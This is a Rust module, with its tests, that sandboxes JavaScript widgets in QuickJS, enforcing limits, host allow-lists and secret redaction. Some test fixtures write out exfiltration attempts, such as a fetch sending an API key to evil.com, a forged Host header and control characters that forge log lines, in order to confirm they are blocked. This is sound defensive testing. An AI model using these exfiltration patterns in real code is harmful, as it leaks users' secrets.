//! Runs one widget's `widget.js` in an isolated QuickJS runtime with time and
//! memory limits and a minimal host API (fetch, storage, log, time, format).

mod host;
pub use host::ReqwestClient;
mod permissions;

use std::future::Future;
use std::path::PathBuf;
use std::pin::Pin;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use rquickjs::prelude::Async;
use rquickjs::{
    AsyncContext, AsyncRuntime, CaughtError, Ctx, Exception, Function, Module, Promise,
};
use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};

use crate::display::Output;
use crate::logbook::LogBook;
use crate::manifest::{Manifest, Permissions};
use crate::secrets::Redactor;

/// Wall-time and JS heap limits for one run.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Limits {
    pub timeout: Duration,
    pub memory_bytes: usize,
}

impl Default for Limits {
    fn default() -> Self {
        Limits {
            timeout: Duration::from_secs(10),
            memory_bytes: 32 * 1024 * 1024,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
pub struct HttpRequest {
    pub method: String,
    pub url: String,
    pub headers: Vec<(String, String)>,
    pub body: Option<String>,
    /// Hostnames the widget may contact; set by `send`, never by widget code.
    /// A client that follows redirects must re-check every hop against these.
    #[serde(skip)]
    pub allowed_hosts: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct HttpResponse {
    pub status: u16,
    pub headers: Vec<(String, String)>,
    pub body: String,
}

pub type HttpFuture<'a> = Pin<Box<dyn Future<Output = Result<HttpResponse, String>> + Send + 'a>>;

/// Performs a widget's HTTP request.
pub trait HttpClient: Send + Sync {
    fn send(&self, req: HttpRequest) -> HttpFuture<'_>;
}

pub struct RunContext {
    pub manifest: Arc<Manifest>,
    pub widget_dir: PathBuf,
    pub instance_id: String,
    pub settings: Map<String, Value>,
    pub http: Arc<dyn HttpClient>,
    /// Per-instance storage file (`paths::storage_file(&instance_id)`).
    pub storage_path: PathBuf,
    pub limits: Limits,
    /// The permissions the user approved. URLs are checked against these,
    /// never against what the manifest declares.
    pub permissions: Permissions,
    /// Widget log lines are also kept here, under `instance_id`.
    pub logbook: LogBook,
    /// Replaces the instance's secret values in widget log lines.
    pub redactor: Arc<Redactor>,
}

#[derive(Debug, thiserror::Error)]
pub enum RunError {
    #[error("widget timed out")]
    Timeout,
    #[error("widget ran out of memory")]
    OutOfMemory,
    #[error("script error: {0}")]
    Script(String),
    #[error("bad output: {0}")]
    BadOutput(String),
    #[error("permission denied: {0}")]
    Permission(String),
}

const PRELUDE: &str = include_str!("prelude.js");

/// Largest result JSON a widget may return; checked before parsing.
pub const OUTPUT_MAX_BYTES: usize = 128 * 1024;
/// `RunError` messages are cut to this many characters (they end up in the
/// log and in tooltips).
pub const ERROR_MAX_CHARS: usize = 300;
/// Most fetches one run may have in flight; the rest wait.
pub const FETCH_MAX_IN_FLIGHT: usize = 4;
/// Total response bytes one run may receive.
pub const FETCH_BUDGET_BYTES: usize = 8 * 1024 * 1024;
/// Log target of widget `console.log` / `log` lines.
pub const WIDGET_LOG_TARGET: &str = "perchbar::widget";

/// Cuts an error message to `ERROR_MAX_CHARS` characters, the last one an
/// ellipsis, and blanks control characters, so a widget cannot flood or
/// forge log lines or tooltips. Secret values are replaced first, so the cut
/// can never leave part of one, and again after blanking, in case that
/// formed one.
fn clip(redactor: &Redactor, msg: impl Into<String>) -> String {
    let msg = redactor.apply(&host::without_controls(&redactor.apply(&msg.into())));
    if msg.chars().count() <= ERROR_MAX_CHARS {
        return msg;
    }
    let mut cut: String = msg.chars().take(ERROR_MAX_CHARS - 1).collect();
    cut.push('…');
    cut
}

/// Runs `widget.js` once in a fresh runtime and returns its parsed output.
/// Storage changes are saved even when the run fails or times out.
pub async fn run(ctx: RunContext) -> Result<Output, RunError> {
    let source = std::fs::read_to_string(ctx.widget_dir.join("widget.js")).map_err(|e| {
        RunError::Script(clip(&ctx.redactor, format!("cannot read widget.js: {e}")))
    })?;
    let storage = Arc::new(Mutex::new(host::Storage::load(ctx.storage_path.clone())));
    let limits = ctx.limits;
    let violation = Arc::new(Mutex::new(None));

    let result = tokio::time::timeout(
        limits.timeout,
        execute(&ctx, source, storage.clone(), violation.clone()),
    )
    .await
    .unwrap_or(Err(RunError::Timeout));

    if let Err(e) = storage.lock().unwrap().save_if_dirty() {
        log::warn!("[{}] could not save storage: {e}", ctx.instance_id);
    }

    let json = result?.ok_or_else(|| RunError::BadOutput("widget returned nothing".into()))?;
    if json.len() > OUTPUT_MAX_BYTES {
        return Err(RunError::Script("output too large".into()));
    }
    let value: Value =
        serde_json::from_str(&json).map_err(|e| bad_output(&ctx.redactor, e.to_string()))?;
    crate::display::parse(value).map_err(|e| bad_output(&ctx.redactor, e.to_string()))
}

fn bad_output(redactor: &Redactor, msg: String) -> RunError {
    RunError::BadOutput(clip(redactor, msg))
}

/// Evaluates the prelude and widget in a fresh runtime + context; returns the
/// JSON text of the widget's result (`None` if it returned `undefined`).
async fn execute(
    ctx: &RunContext,
    source: String,
    storage: Arc<Mutex<host::Storage>>,
    violation: Violation,
) -> Result<Option<String>, RunError> {
    let script_err = |e: rquickjs::Error| RunError::Script(clip(&ctx.redactor, e.to_string()));
    let rt = AsyncRuntime::new().map_err(script_err)?;
    rt.set_memory_limit(ctx.limits.memory_bytes).await;
    let interrupted = Arc::new(AtomicBool::new(false));
    let deadline = Instant::now() + ctx.limits.timeout;
    let flag = interrupted.clone();
    rt.set_interrupt_handler(Some(Box::new(move || {
        let expired = Instant::now() >= deadline;
        if expired {
            flag.store(true, Ordering::Relaxed);
        }
        expired
    })))
    .await;
    let js = AsyncContext::full(&rt).await.map_err(script_err)?;

    let instance_id = ctx.instance_id.clone();
    let http = ctx.http.clone();
    let allowed = ctx.permissions.network.clone();
    let logbook = ctx.logbook.clone();
    let redactor = ctx.redactor.clone();
    let seen = violation.clone();
    let settings = Value::Object(ctx.settings.clone()).to_string();
    js.async_with(async move |ctx| {
        let result: rquickjs::Result<Option<String>> = async {
            install_fetch(&ctx, http, allowed, seen, redactor.clone())?;
            host::install(&ctx, storage, instance_id, logbook, redactor.clone())?;
            let invoke: Function = ctx.eval(PRELUDE)?;
            let (module, loaded) = Module::declare(ctx.clone(), "widget.js", source)?.eval()?;
            loaded.into_future::<()>().await?;
            let update: rquickjs::Value = module.get("default")?;
            let pending: Promise = invoke.call((update, settings))?;
            pending.into_future::<Option<String>>().await
        }
        .await;
        result.map_err(|e| classify(&ctx, e, &interrupted, &violation, &redactor))
    })
    .await
}

/// Maps an engine error to a `RunError`, telling limits apart from script bugs.
fn classify(
    ctx: &Ctx<'_>,
    err: rquickjs::Error,
    interrupted: &AtomicBool,
    violation: &Violation,
    redactor: &Redactor,
) -> RunError {
    if matches!(err, rquickjs::Error::Allocation) {
        return RunError::OutOfMemory;
    }
    let message = redactor.apply(&CaughtError::from_error(ctx, err).to_string());
    if interrupted.load(Ordering::Relaxed) {
        RunError::Timeout
    } else if message.contains("out of memory") {
        RunError::OutOfMemory
    } else if let Some(v) = violation
        .lock()
        .unwrap()
        .as_ref()
        .filter(|v| message.contains(*v))
    {
        RunError::Permission(clip(redactor, v.clone()))
    } else {
        RunError::Script(clip(redactor, message))
    }
}

/// The last permission violation a fetch raised; lets an uncaught rejection
/// be reported as `RunError::Permission` instead of a plain script error.
type Violation = Arc<Mutex<Option<String>>>;

/// Installs the hidden `__host_fetch(reqJson) -> Promise<respJson>`.
fn install_fetch<'js>(
    ctx: &Ctx<'js>,
    http: Arc<dyn HttpClient>,
    allowed: Vec<String>,
    violation: Violation,
    redactor: Arc<Redactor>,
) -> rquickjs::Result<()> {
    // Per run (each run installs fetch into a fresh context): a cap on
    // requests in flight and on the total response bytes.
    let in_flight = Arc::new(tokio::sync::Semaphore::new(FETCH_MAX_IN_FLIGHT));
    let received = Arc::new(AtomicUsize::new(0));
    let fetch = Function::new(
        ctx.clone(),
        Async(move |ctx: Ctx<'js>, req: String| {
            let http = http.clone();
            let allowed = allowed.clone();
            let violation = violation.clone();
            let redactor = redactor.clone();
            let in_flight = in_flight.clone();
            let received = received.clone();
            async move {
                let over_budget = || {
                    Exception::throw_message(
                        &ctx,
                        "fetch failed: Perchbar: this run received more than 8 MB of responses",
                    )
                };
                let req: HttpRequest = serde_json::from_str(&req)
                    .map_err(|e| Exception::throw_type(&ctx, &format!("fetch: {e}")))?;
                let _permit = in_flight
                    .acquire()
                    .await
                    .map_err(|_| Exception::throw_message(&ctx, "fetch: closed"))?;
                if received.load(Ordering::Relaxed) >= FETCH_BUDGET_BYTES {
                    return Err(over_budget());
                }
                let resp = match send(http.as_ref(), req, &allowed).await {
                    Ok(resp) => resp,
                    Err(SendError::Denied(msg)) => {
                        // The URL may hold a secret: hide it before the
                        // message is logged, stored or thrown.
                        let msg = redactor.apply(&msg);
                        log::warn!("blocked widget request: {msg}");
                        *violation.lock().unwrap() = Some(msg.clone());
                        return Err(Exception::throw_type(&ctx, &msg));
                    }
                    Err(SendError::Failed(e)) => {
                        return Err(Exception::throw_message(
                            &ctx,
                            &format!("fetch failed: {e}"),
                        ));
                    }
                };
                let total =
                    received.fetch_add(resp.body.len(), Ordering::Relaxed) + resp.body.len();
                if total > FETCH_BUDGET_BYTES {
                    return Err(over_budget());
                }
                serde_json::to_string(&resp)
                    .map_err(|e| Exception::throw_message(&ctx, &format!("fetch: {e}")))
            }
        }),
    )?;
    ctx.globals().set("__host_fetch", fetch)
}

enum SendError {
    /// The URL is not on the widget's allow-list.
    Denied(String),
    Failed(String),
}

/// Every widget request goes through here: the URL allow-list and the header
/// deny-list are checked first.
async fn send(
    http: &dyn HttpClient,
    mut req: HttpRequest,
    allowed: &[String],
) -> Result<HttpResponse, SendError> {
    let checked = permissions::check_url(&req.url, allowed).map_err(SendError::Denied)?;
    // Hand the client the URL that was checked, not the raw widget string.
    req.url = checked.into();
    permissions::check_headers(&req.headers).map_err(SendError::Denied)?;
    req.allowed_hosts = allowed.to_vec();
    http.send(req).await.map_err(SendError::Failed)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::display::Block;
    use serde_json::json;
    use std::time::Instant;

    struct FakeHttp {
        body: String,
    }

    impl HttpClient for FakeHttp {
        fn send(&self, req: HttpRequest) -> HttpFuture<'_> {
            let body = self.body.clone();
            Box::pin(async move {
                Ok(HttpResponse {
                    status: 200,
                    headers: vec![("Content-Type".into(), "application/json".into())],
                    body: body.replace("{url}", &req.url),
                })
            })
        }
    }

    struct Fixture {
        dir: tempfile::TempDir,
        settings: Map<String, Value>,
        limits: Limits,
        http_body: String,
        network: Vec<String>,
        /// Approved hosts; `None` approves exactly what the manifest declares.
        approved: Option<Vec<String>>,
        logbook: LogBook,
        http: Option<Arc<dyn HttpClient>>,
        redactor: Arc<Redactor>,
    }

    /// An HTTP client whose requests never complete.
    struct HangHttp;

    impl HttpClient for HangHttp {
        fn send(&self, _req: HttpRequest) -> HttpFuture<'_> {
            Box::pin(std::future::pending())
        }
    }

    impl Fixture {
        fn new(js: &str) -> Fixture {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("widget.js"), js).unwrap();
            Fixture {
                dir,
                settings: Map::new(),
                limits: Limits::default(),
                http_body: "{}".into(),
                network: Vec::new(),
                approved: None,
                logbook: LogBook::default(),
                http: None,
                redactor: Arc::default(),
            }
        }

        fn storage_path(&self) -> PathBuf {
            self.dir.path().join("storage").join("inst-1.json")
        }

        fn ctx(&self) -> RunContext {
            let manifest: Manifest = serde_json::from_value(json!({
                "id": "test",
                "name": "Test",
                "formatVersion": 1,
                "permissions": {"network": self.network},
            }))
            .unwrap();
            RunContext {
                manifest: Arc::new(manifest),
                widget_dir: self.dir.path().to_path_buf(),
                instance_id: "inst-1".into(),
                settings: self.settings.clone(),
                http: self.http.clone().unwrap_or_else(|| {
                    Arc::new(FakeHttp {
                        body: self.http_body.clone(),
                    })
                }),
                storage_path: self.storage_path(),
                limits: self.limits,
                permissions: Permissions {
                    network: self.approved.clone().unwrap_or(self.network.clone()),
                    ..Permissions::default()
                },
                logbook: self.logbook.clone(),
                redactor: self.redactor.clone(),
            }
        }

        async fn run(&self) -> Result<Output, RunError> {
            run(self.ctx()).await
        }
    }

    fn text(out: &Output) -> &str {
        match &out.frames[0].blocks[0] {
            Block::Text { value, .. } => value,
            other => panic!("expected text block, got {other:?}"),
        }
    }

    /// Wraps a JS expression as a widget returning it as a single text block.
    fn returning(expr: &str) -> String {
        format!(
            "export default async function update({{ settings, storage, log, time }}) {{\n\
             return {{ blocks: [{{ type: \"text\", value: String({expr}) }}] }};\n}}"
        )
    }

    #[allow(dead_code)]
    fn run_future_is_send(ctx: RunContext) {
        fn is_send<T: Send>(_: T) {}
        is_send(run(ctx));
    }

    #[tokio::test]
    async fn returns_parsed_output() {
        let f = Fixture::new(
            r#"export default async function update() {
                return { blocks: [{ type: "text", value: "hi" }] };
            }"#,
        );
        let out = f.run().await.unwrap();
        assert_eq!(text(&out), "hi");
    }

    #[tokio::test]
    async fn settings_are_passed() {
        let mut f = Fixture::new(&returning("settings.city"));
        f.settings.insert("city".into(), json!("Lisbon"));
        assert_eq!(text(&f.run().await.unwrap()), "Lisbon");
    }

    #[tokio::test]
    async fn script_error_reports_message() {
        let f = Fixture::new(
            "export default async function update() {\n  throw new Error(\"boom\");\n}",
        );
        match f.run().await {
            Err(RunError::Script(m)) => {
                assert!(m.contains("boom"), "{m}");
                assert!(m.contains("widget.js:2"), "line missing: {m}");
            }
            other => panic!("expected Script error, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn sandbox_timeout_is_error() {
        let mut f = Fixture::new("export default async function update() { while (true) {} }");
        f.limits.timeout = Duration::from_millis(200);
        let start = Instant::now();
        let res = f.run().await;
        assert!(matches!(res, Err(RunError::Timeout)), "{res:?}");
        assert!(start.elapsed() < Duration::from_secs(5));
    }

    #[tokio::test]
    async fn awaiting_forever_is_timeout() {
        let mut f =
            Fixture::new("export default async function update() { await new Promise(() => {}); }");
        f.limits.timeout = Duration::from_millis(200);
        let res = f.run().await;
        assert!(matches!(res, Err(RunError::Timeout)), "{res:?}");
    }

    #[tokio::test]
    async fn memory_limit_is_error() {
        let mut f = Fixture::new(
            r#"export default async function update() {
                const keep = [];
                while (true) keep.push(new Array(100000).fill(1.5));
            }"#,
        );
        f.limits.timeout = Duration::from_secs(5);
        let res = f.run().await;
        assert!(matches!(res, Err(RunError::OutOfMemory)), "{res:?}");
    }

    #[tokio::test]
    async fn output_over_128kb_is_rejected_before_parsing() {
        let f = Fixture::new(
            r#"export default async function update() {
                return { blocks: [{ type: "text", value: "x".repeat(140000) }] };
            }"#,
        );
        match f.run().await {
            Err(RunError::Script(m)) => assert_eq!(m, "output too large"),
            other => panic!("expected Script(output too large), got {other:?}"),
        }
    }

    #[tokio::test]
    async fn output_just_under_128kb_is_accepted() {
        let f = Fixture::new(
            r#"export default async function update() {
                return { blocks: [{ type: "text", value: "x".repeat(120000) }] };
            }"#,
        );
        assert!(f.run().await.is_ok());
    }

    #[tokio::test]
    async fn long_script_error_is_cut_to_300_chars() {
        let f = Fixture::new(
            "export default async function update() {\n  throw new Error(\"e\".repeat(5000));\n}",
        );
        match f.run().await {
            Err(RunError::Script(m)) => {
                assert_eq!(m.chars().count(), ERROR_MAX_CHARS, "{m}");
                assert!(m.ends_with('…'));
            }
            other => panic!("expected Script error, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn script_error_has_no_control_characters() {
        let f = Fixture::new(
            "export default async function update() {\n  throw new Error(\"a\\nperchbar::x ERROR fake\\x1b[31m\");\n}",
        );
        match f.run().await {
            Err(RunError::Script(m)) => {
                assert!(m.contains("a perchbar::x ERROR fake [31m"), "{m:?}");
                assert!(!m.chars().any(char::is_control), "{m:?}");
            }
            other => panic!("expected Script error, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn long_bad_output_error_is_cut_to_300_chars() {
        let f = Fixture::new(&format!(
            "export default async function update() {{ return {{ blocks: [], {}: 1 }}; }}",
            "k".repeat(1000)
        ));
        match f.run().await {
            Err(RunError::BadOutput(m)) => assert!(m.chars().count() <= ERROR_MAX_CHARS, "{m}"),
            other => panic!("expected BadOutput error, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn invalid_output_is_error() {
        let f = Fixture::new("export default async function update() { return 42; }");
        let res = f.run().await;
        assert!(matches!(res, Err(RunError::BadOutput(_))), "{res:?}");
    }

    #[tokio::test]
    async fn storage_persists_between_runs() {
        let f = Fixture::new(&returning(
            "(() => { const n = (storage.get(\"n\") ?? 0) + 1; storage.set(\"n\", n); return n; })()",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "1");
        assert_eq!(text(&f.run().await.unwrap()), "2");
        let saved: Value =
            serde_json::from_str(&std::fs::read_to_string(f.storage_path()).unwrap()).unwrap();
        assert_eq!(saved, json!({"n": 2}));
    }

    #[tokio::test]
    async fn storage_set_before_error_is_kept() {
        let f = Fixture::new(
            r#"export default async function update({ storage }) {
                storage.set("seen", true);
                throw new Error("later failure");
            }"#,
        );
        assert!(matches!(f.run().await, Err(RunError::Script(_))));
        let saved: Value =
            serde_json::from_str(&std::fs::read_to_string(f.storage_path()).unwrap()).unwrap();
        assert_eq!(saved, json!({"seen": true}));
    }

    #[tokio::test]
    async fn storage_over_64kb_throws_and_is_not_saved() {
        let f = Fixture::new(&returning(
            "(() => { storage.set(\"small\", 1); \
             try { storage.set(\"big\", \"x\".repeat(70000)); return \"stored\"; } \
             catch (e) { return \"threw\"; } })()",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "threw");
        let saved: Value =
            serde_json::from_str(&std::fs::read_to_string(f.storage_path()).unwrap()).unwrap();
        assert_eq!(saved, json!({"small": 1}));
    }

    #[tokio::test]
    async fn no_node_or_browser_globals() {
        let f = Fixture::new(&returning(
            "[typeof require, typeof process, typeof window, typeof XMLHttpRequest, \
              typeof __host_fetch, typeof globalThis.__host_fetch].join(\",\")",
        ));
        assert_eq!(
            text(&f.run().await.unwrap()),
            "undefined,undefined,undefined,undefined,undefined,undefined"
        );
    }

    #[tokio::test]
    async fn time_now_respects_timezone() {
        let f = Fixture::new(&returning(
            "[time.now(\"Asia/Tokyo\").offsetMinutes, typeof time.now().hhmm].join(\",\")",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "540,string");
    }

    #[tokio::test]
    async fn time_now_unknown_tz_is_type_error() {
        let f = Fixture::new(&returning(
            "(() => { try { time.now(\"Mars/Base\"); return \"ok\"; } \
             catch (e) { return e instanceof TypeError; } })()",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "true");
    }

    #[tokio::test]
    async fn format_money_usd() {
        let f = Fixture::new(&returning(
            "[format.money(67120.4, \"USD\"), format.money(3.456, \"EUR\")].join(\"|\")",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "$67,120|€3.46");
    }

    #[tokio::test]
    async fn fetch_uses_http_client() {
        let mut f = Fixture::new(&returning(
            "await (async () => { const r = await fetch(\"https://api.example.com/x\"); \
             const j = await r.json(); return [r.ok, r.status, j.url].join(\",\"); })()",
        ));
        f.http_body = r#"{"url": "{url}"}"#.into();
        f.network = vec!["api.example.com".into()];
        assert_eq!(
            text(&f.run().await.unwrap()),
            "true,200,https://api.example.com/x"
        );
    }

    #[tokio::test]
    async fn console_log_is_available() {
        let f = Fixture::new(&returning(
            "(() => { console.log(\"a\", 1, { b: 2 }); log(\"c\"); return \"logged\"; })()",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "logged");
        let lines: Vec<String> = f
            .logbook
            .lines("inst-1")
            .into_iter()
            .map(|l| {
                assert_eq!(l.level, crate::logbook::LogLevel::Info);
                l.text
            })
            .collect();
        assert_eq!(lines, vec!["a 1 {\"b\":2}", "c"]);
    }

    #[tokio::test]
    async fn console_levels_reach_the_logbook() {
        use crate::logbook::LogLevel;
        let f = Fixture::new(&returning(
            "(() => { console.info(\"i\"); console.warn(\"w\"); console.error(\"e\"); return 1; })()",
        ));
        f.run().await.unwrap();
        let got: Vec<(LogLevel, String)> = f
            .logbook
            .lines("inst-1")
            .into_iter()
            .map(|l| (l.level, l.text))
            .collect();
        assert_eq!(
            got,
            vec![
                (LogLevel::Info, "i".to_string()),
                (LogLevel::Warn, "w".to_string()),
                (LogLevel::Error, "e".to_string()),
            ]
        );
    }

    #[tokio::test]
    async fn run_errors_are_redacted_before_the_clip() {
        const SECRET: &str = "sk-1234567890";
        let mut straddled = false;
        // Slide the secret across the 300-char cut.
        for pad in 280..300 {
            let mut f = Fixture::new(&format!(
                "export default async function update({{ settings }}) {{\n\
                 throw new Error(\"x\".repeat({pad}) + settings.apiKey);\n}}"
            ));
            f.settings.insert("apiKey".into(), json!(SECRET));
            f.redactor = Arc::new(Redactor::new([SECRET.to_string()]));
            let m = match f.run().await {
                Err(RunError::Script(m)) => m,
                other => panic!("expected a script error, got {other:?}"),
            };
            assert!(!m.contains(&SECRET[..4]), "pad {pad}: {m}");
            straddled |= m.contains("[sec") && !m.contains("[secret]");
        }
        assert!(straddled, "no offset put the secret across the cut");
    }

    #[tokio::test]
    async fn bad_output_and_violations_are_redacted() {
        const SECRET: &str = "sk-1234567890";
        let mut f = Fixture::new(
            "export default async function update({ settings }) {\n\
             return { blocks: [{ type: settings.apiKey }] };\n}",
        );
        f.settings.insert("apiKey".into(), json!(SECRET));
        f.redactor = Arc::new(Redactor::new([SECRET.to_string()]));
        match f.run().await {
            Err(RunError::BadOutput(m)) => assert!(!m.contains(&SECRET[..4]), "{m}"),
            other => panic!("expected bad output, got {other:?}"),
        }

        let mut f = Fixture::new(
            "export default async function update({ settings }) {\n\
             await fetch(\"https://evil.com/?k=\" + settings.apiKey);\n}",
        );
        f.settings.insert("apiKey".into(), json!(SECRET));
        f.redactor = Arc::new(Redactor::new([SECRET.to_string()]));
        match f.run().await {
            Err(RunError::Permission(m)) => {
                assert!(!m.contains(&SECRET[..4]), "{m}");
                assert!(m.contains("evil.com"), "{m}");
            }
            other => panic!("expected a permission error, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn widget_log_lines_are_redacted() {
        let mut f = Fixture::new(&returning(
            "(() => { log(\"key=\" + settings.apiKey + \"\\n\" + \"x\".repeat(1009) + settings.apiKey); return 1; })()",
        ));
        f.settings.insert("apiKey".into(), json!("sk-12345"));
        f.redactor = Arc::new(Redactor::new(["sk-12345".to_string()]));
        f.run().await.unwrap();
        let lines = f.logbook.lines("inst-1");
        assert_eq!(lines.len(), 1);
        assert!(
            lines[0].text.starts_with("key=[secret] "),
            "{}",
            lines[0].text
        );
        // The second copy straddles the 1,024-byte cut: redacted first, so
        // no fragment of the secret survives the cut.
        assert_eq!(lines[0].text.len(), 1024);
        assert!(lines[0].text.ends_with("x[s"), "{}", lines[0].text);
    }

    #[tokio::test]
    async fn fetch_checks_approved_hosts_not_the_manifest() {
        let mut f = Fixture::new(&format!(
            "export default async function update() {{ {UNDECLARED_FETCH}; return {{ blocks: [] }}; }}"
        ));
        // Declared in the manifest, but the user approved nothing.
        f.network = vec!["evil.com".into()];
        f.approved = Some(Vec::new());
        match f.run().await {
            Err(RunError::Permission(m)) => {
                assert!(m.contains("host not allowed: evil.com"), "{m}")
            }
            other => panic!("expected Permission error, got {other:?}"),
        }
    }

    /// Keeps every log record of the test binary as (target, level, text).
    struct Capture(Mutex<Vec<(String, log::Level, String)>>);

    impl log::Log for Capture {
        fn enabled(&self, _: &log::Metadata) -> bool {
            true
        }
        fn log(&self, r: &log::Record) {
            self.0
                .lock()
                .unwrap()
                .push((r.target().to_string(), r.level(), r.args().to_string()));
        }
        fn flush(&self) {}
    }

    static CAPTURE: Capture = Capture(Mutex::new(Vec::new()));

    #[tokio::test]
    async fn console_log_reaches_the_log_as_a_perchbar_record() {
        let _ = log::set_logger(&CAPTURE);
        log::set_max_level(log::LevelFilter::Trace);
        let f = Fixture::new(&returning(
            "(() => { console.log(\"marker-7f3a\", 42); return \"ok\"; })()",
        ));
        assert_eq!(text(&f.run().await.unwrap()), "ok");
        let records = CAPTURE.0.lock().unwrap();
        let (target, level, msg) = records
            .iter()
            .find(|(_, _, m)| m.contains("marker-7f3a"))
            .expect("widget log record captured");
        assert_eq!(target, WIDGET_LOG_TARGET);
        assert!(target.starts_with("perchbar"));
        assert_eq!(*level, log::Level::Info);
        assert_eq!(msg, "[inst-1] marker-7f3a 42");
    }

    /// Counts concurrent requests and bytes served; every response is a
    /// body of `body_len` bytes after a short delay.
    struct CountingHttp {
        body_len: usize,
        active: std::sync::atomic::AtomicUsize,
        max_active: std::sync::atomic::AtomicUsize,
        requests: std::sync::atomic::AtomicUsize,
        bytes: std::sync::atomic::AtomicUsize,
    }

    impl CountingHttp {
        fn new(body_len: usize) -> Arc<CountingHttp> {
            Arc::new(CountingHttp {
                body_len,
                active: Default::default(),
                max_active: Default::default(),
                requests: Default::default(),
                bytes: Default::default(),
            })
        }
    }

    impl HttpClient for CountingHttp {
        fn send(&self, _req: HttpRequest) -> HttpFuture<'_> {
            use std::sync::atomic::Ordering::SeqCst;
            Box::pin(async move {
                self.requests.fetch_add(1, SeqCst);
                let now = self.active.fetch_add(1, SeqCst) + 1;
                self.max_active.fetch_max(now, SeqCst);
                tokio::time::sleep(Duration::from_millis(30)).await;
                self.active.fetch_sub(1, SeqCst);
                self.bytes.fetch_add(self.body_len, SeqCst);
                Ok(HttpResponse {
                    status: 200,
                    headers: Vec::new(),
                    body: "a".repeat(self.body_len),
                })
            })
        }
    }

    #[tokio::test]
    async fn at_most_four_fetches_in_flight_per_run() {
        use std::sync::atomic::Ordering::SeqCst;
        let http = CountingHttp::new(2);
        let mut f = Fixture::new(&returning(
            "await (async () => { const all = []; \
             for (let i = 0; i < 12; i++) all.push(fetch(\"https://api.example.com/\" + i)); \
             const rs = await Promise.all(all); return rs.filter(r => r.ok).length; })()",
        ));
        f.network = vec!["api.example.com".into()];
        f.http = Some(http.clone());
        assert_eq!(text(&f.run().await.unwrap()), "12");
        assert_eq!(http.requests.load(SeqCst), 12);
        assert_eq!(http.max_active.load(SeqCst), FETCH_MAX_IN_FLIGHT);
    }

    #[tokio::test]
    async fn response_bytes_over_8mb_per_run_fail_the_fetch() {
        use std::sync::atomic::Ordering::SeqCst;
        let http = CountingHttp::new(3 * 1024 * 1024);
        let mut f = Fixture::new(&returning(
            "await (async () => { const out = []; for (let i = 0; i < 4; i++) { \
             try { const r = await fetch(\"https://api.example.com/\" + i); \
             out.push((await r.text()).length > 0 ? \"ok\" : \"empty\"); } \
             catch (e) { out.push(e.message.includes(\"more than 8 MB\") ? \"budget\" : e.message); } }              return out.join(\"|\"); })()",
        ));
        f.network = vec!["api.example.com".into()];
        f.http = Some(http.clone());
        f.limits.memory_bytes = 64 * 1024 * 1024;
        let out = f.run().await.unwrap();
        let parts: Vec<&str> = text(&out).split('|').collect();
        assert_eq!(parts[..2], ["ok", "ok"], "{}", text(&out));
        assert_eq!(parts[2..], ["budget", "budget"], "{}", text(&out));
        // The fourth fetch is refused without a request.
        assert_eq!(http.requests.load(SeqCst), 3);
        assert!(http.bytes.load(SeqCst) <= 9 * 1024 * 1024);
    }

    const UNDECLARED_FETCH: &str = "await fetch(\"https://evil.com/steal\")";

    #[tokio::test]
    async fn undeclared_fetch_rejects_promise_in_js() {
        let mut f = Fixture::new(&returning(&format!(
            "await (async () => {{ try {{ {UNDECLARED_FETCH}; return \"fetched\"; }}              catch (e) {{ return e.name + \": \" + e.message; }} }})()"
        )));
        f.network = vec!["api.example.com".into()];
        let out = f.run().await.unwrap();
        assert!(
            text(&out).contains("host not allowed: evil.com"),
            "{}",
            text(&out)
        );
        assert!(text(&out).starts_with("TypeError"), "{}", text(&out));
    }

    #[tokio::test]
    async fn uncaught_undeclared_fetch_is_permission_error() {
        let mut f = Fixture::new(&format!(
            "export default async function update() {{ {UNDECLARED_FETCH}; return {{ blocks: [] }}; }}"
        ));
        f.network = vec!["api.example.com".into()];
        match f.run().await {
            Err(RunError::Permission(m)) => {
                assert!(m.contains("host not allowed: evil.com"), "{m}")
            }
            other => panic!("expected Permission error, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn timeout_during_pending_fetch() {
        let mut f = Fixture::new(&returning("await fetch(\"https://api.example.com/slow\")"));
        f.network = vec!["api.example.com".into()];
        f.http = Some(Arc::new(HangHttp));
        f.limits.timeout = Duration::from_millis(200);
        let start = Instant::now();
        let res = f.run().await;
        assert!(matches!(res, Err(RunError::Timeout)), "{res:?}");
        assert!(start.elapsed() < Duration::from_secs(5));
    }

    #[tokio::test]
    async fn forbidden_header_rejects_fetch_with_type_error() {
        let mut f = Fixture::new(&returning(
            "await (async () => { try { await fetch(\"https://api.example.com/x\",              { headers: { Host: \"evil.com\" } }); return \"sent\"; }              catch (e) { return e.name + \": \" + e.message; } })()",
        ));
        f.network = vec!["api.example.com".into()];
        assert_eq!(
            text(&f.run().await.unwrap()),
            "TypeError: Perchbar: header not allowed: Host"
        );
    }
}
